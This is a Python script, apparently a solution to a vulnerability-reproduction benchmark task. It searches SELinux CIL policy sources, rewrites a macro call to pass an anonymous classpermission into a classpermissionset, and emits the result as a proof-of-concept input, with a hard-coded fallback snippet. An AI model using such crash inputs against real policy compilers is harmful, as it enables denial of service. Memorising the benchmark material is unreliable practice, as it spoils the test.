import os
import re
import tarfile


def find_matching_paren(s: str, start: int) -> int:
    if start < 0 or start >= len(s) or s[start] != '(':
        return -1
    depth = 1
    i = start + 1
    n = len(s)
    while i < n:
        c = s[i]
        if c == '(':
            depth += 1
        elif c == ')':
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def split_top_level(s: str):
    tokens = []
    current = []
    depth = 0
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c in ' \t\r\n':
            if depth == 0:
                if current:
                    tokens.append(''.join(current))
                    current = []
            else:
                current.append(c)
        elif c == '(':
            depth += 1
            current.append(c)
        elif c == ')':
            depth -= 1
            current.append(c)
        else:
            current.append(c)
        i += 1
    if current:
        tokens.append(''.join(current))
    return [t for t in tokens if t]


def parse_paramlist(paramlist_text: str):
    params = []
    inner = paramlist_text.strip()
    if not (inner.startswith('(') and inner.endswith(')')):
        return params
    inner = inner[1:-1].strip()
    if not inner:
        return params
    tokens = split_top_level(inner)
    for tok in tokens:
        t = tok.strip()
        if not (t.startswith('(') and t.endswith(')')):
            continue
        inner2 = t[1:-1].strip()
        if not inner2:
            continue
        parts = inner2.split()
        if len(parts) >= 2:
            pname = parts[0]
            ptype = parts[1]
            params.append((pname, ptype))
    return params


def parse_cil_file(text: str):
    cp_defs = {}
    macros = []

    # Parse classpermission definitions
    pos = 0
    while True:
        m = re.search(r'\(classpermission\s+([^\s()]+)\b', text[pos:])
        if not m:
            break
        start = pos + m.start()
        name = m.group(1)
        end = find_matching_paren(text, start)
        if end == -1:
            break
        expr = text[start:end + 1]
        inner = expr[1:-1].strip()
        tokens = split_top_level(inner)
        if len(tokens) >= 3 and tokens[0] == 'classpermission' and tokens[1] == name:
            cp_body_expr = tokens[2]
            cp_defs[name] = cp_body_expr
        pos = end + 1

    # Parse macros
    pos = 0
    while True:
        m = re.search(r'\(macro\s+([^\s()]+)\b', text[pos:])
        if not m:
            break
        start = pos + m.start()
        name = m.group(1)
        end = find_matching_paren(text, start)
        if end == -1:
            break
        expr = text[start:end + 1]

        j = len('(macro')
        while j < len(expr) and expr[j].isspace():
            j += 1
        # Skip macro name
        while j < len(expr) and not expr[j].isspace() and expr[j] != '(' and expr[j] != ')':
            j += 1
        while j < len(expr) and expr[j].isspace():
            j += 1

        paramlist_text = None
        body_start = j
        if j < len(expr) and expr[j] == '(':
            params_end = find_matching_paren(expr, j)
            if params_end != -1:
                paramlist_text = expr[j:params_end + 1]
                body_start = params_end + 1

        body_text = expr[body_start:-1].strip()
        macro = {
            'name': name,
            'expr': expr,
            'paramlist': paramlist_text,
            'body': body_text,
        }
        if paramlist_text:
            macro['params'] = parse_paramlist(paramlist_text)
        else:
            macro['params'] = []
        macros.append(macro)
        pos = end + 1

    return cp_defs, macros


def find_macro_calls(text: str, name: str):
    exprs = []

    # Call-style invocations: (call name ...)
    pattern_call = r'\(call\s+' + re.escape(name) + r'\b'
    for m in re.finditer(pattern_call, text):
        start = m.start()
        end = find_matching_paren(text, start)
        if end == -1:
            continue
        exprs.append(text[start:end + 1])

    # Direct-style invocations: (name ...)
    pattern_direct = r'\(' + re.escape(name) + r'\b'
    for m in re.finditer(pattern_direct, text):
        start = m.start()
        # Skip if part of macro definition or call-style
        pre = text[max(0, start - 10):start]
        if '(macro' in pre or '(call' in pre:
            continue
        end = find_matching_paren(text, start)
        if end == -1:
            continue
        exprs.append(text[start:end + 1])

    return exprs


def parse_macro_call_expr(expr: str, macro_name: str):
    inner = expr[1:-1].strip()
    if not inner:
        return None
    tokens = split_top_level(inner)
    if not tokens:
        return None

    style = None
    if tokens[0] == 'call':
        if len(tokens) < 2 or tokens[1] != macro_name:
            return None
        style = 'call'
        base_args = tokens[2:]
    elif tokens[0] == macro_name:
        style = 'direct'
        base_args = tokens[1:]
    else:
        return None

    wrapper = 'none'
    if len(base_args) == 1 and base_args[0].startswith('(') and base_args[0].endswith(')'):
        wrapper = 'parens'
        args_inner = base_args[0][1:-1].strip()
        args = split_top_level(args_inner) if args_inner else []
    else:
        args = base_args

    return {
        'style': style,
        'wrapper': wrapper,
        'args': args,
    }


def load_cil_files_from_tar(path: str):
    files = []
    try:
        with tarfile.open(path, 'r:*') as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name_lower = m.name.lower()
                base = os.path.basename(name_lower)
                if not (name_lower.endswith('.cil') or '.cil' in base):
                    continue
                if m.size <= 0:
                    continue
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                except Exception:
                    continue
                try:
                    text = data.decode('utf-8', errors='ignore')
                except Exception:
                    continue
                files.append((m.name, text))
    except tarfile.ReadError:
        return []
    files.sort(key=lambda x: len(x[1]))
    return files


def load_cil_files_from_dir(root: str):
    entries = []
    for dirpath, _, filenames in os.walk(root):
        for fname in filenames:
            lower = fname.lower()
            if lower.endswith('.cil') or '.cil' in lower:
                full = os.path.join(dirpath, fname)
                try:
                    size = os.path.getsize(full)
                except OSError:
                    continue
                entries.append((size, full))
    entries.sort(key=lambda x: x[0])
    files = []
    for _, path in entries:
        try:
            with open(path, 'rb') as f:
                data = f.read()
            text = data.decode('utf-8', errors='ignore')
        except Exception:
            continue
        files.append((path, text))
    return files


class Solution:
    def solve(self, src_path: str) -> bytes:
        if os.path.isdir(src_path):
            cil_files = load_cil_files_from_dir(src_path)
        else:
            cil_files = load_cil_files_from_tar(src_path)
            if not cil_files and os.path.isdir(src_path):
                cil_files = load_cil_files_from_dir(src_path)

        candidate_fallback = None
        candidate_len = None

        for name, text in cil_files:
            if '(macro' in text and 'classpermission' in text and 'classpermissionset' in text:
                if candidate_fallback is None or len(text) < candidate_len:
                    candidate_fallback = text
                    candidate_len = len(text)

            cp_defs, macros = parse_cil_file(text)
            if not cp_defs or not macros:
                continue

            for macro in macros:
                body = macro['body']
                if 'classpermissionset' not in body:
                    continue

                params = macro.get('params') or []
                if not params:
                    continue

                cp_param_indices = [
                    i for i, (_pname, ptype) in enumerate(params)
                    if 'classpermission' in ptype
                ]
                if not cp_param_indices:
                    continue

                body_lower = body
                cpset_pos = body_lower.find('classpermissionset')
                if cpset_pos == -1:
                    continue

                # Ensure at least one cp param name appears after classpermissionset
                if not any(params[i][0] in body_lower[cpset_pos:] for i in cp_param_indices):
                    continue

                calls = find_macro_calls(text, macro['name'])
                if not calls:
                    continue

                for call_expr in calls:
                    call_info = parse_macro_call_expr(call_expr, macro['name'])
                    if not call_info:
                        continue
                    args = call_info['args']
                    if not args:
                        continue

                    for cp_index in cp_param_indices:
                        if cp_index >= len(args):
                            continue
                        cp_arg_sample = args[cp_index].strip()
                        cp_body_expr = None
                        if cp_arg_sample.startswith('('):
                            cp_body_expr = cp_arg_sample
                        else:
                            cp_name = cp_arg_sample
                            if cp_name in cp_defs:
                                cp_body_expr = cp_defs[cp_name]
                            elif cp_defs:
                                cp_body_expr = next(iter(cp_defs.values()))
                        if not cp_body_expr:
                            continue

                        new_args = list(args)
                        new_args[cp_index] = cp_body_expr

                        style = call_info['style']
                        wrapper = call_info['wrapper']
                        if wrapper == 'parens':
                            base_args_str = '(' + ' '.join(new_args) + ')'
                        else:
                            base_args_str = ' '.join(new_args)

                        if style == 'call':
                            if base_args_str:
                                new_inner = 'call ' + macro['name'] + ' ' + base_args_str
                            else:
                                new_inner = 'call ' + macro['name']
                        else:
                            if base_args_str:
                                new_inner = macro['name'] + ' ' + base_args_str
                            else:
                                new_inner = macro['name']

                        new_call_expr = '(' + new_inner + ')'

                        poc_text = text
                        if not poc_text.endswith('\n'):
                            poc_text += '\n'
                        poc_text += new_call_expr + '\n'
                        return poc_text.encode('utf-8', errors='ignore')

        if candidate_fallback is not None:
            return candidate_fallback.encode('utf-8', errors='ignore')

        # Static minimal fallback: approximate CIL snippet using macros,
        # classpermission, and classpermissionset.
        fallback_snippet = """
(block poc_block
    (class file (read write getattr))
    (classpermission cp1 (file (read write)))
    (macro use_cp ((p classpermission))
        (classpermissionset cps1 (p))
    )
    (call use_cp ((file (read write))))
)
"""
        return fallback_snippet.strip().encode('utf-8', errors='ignore')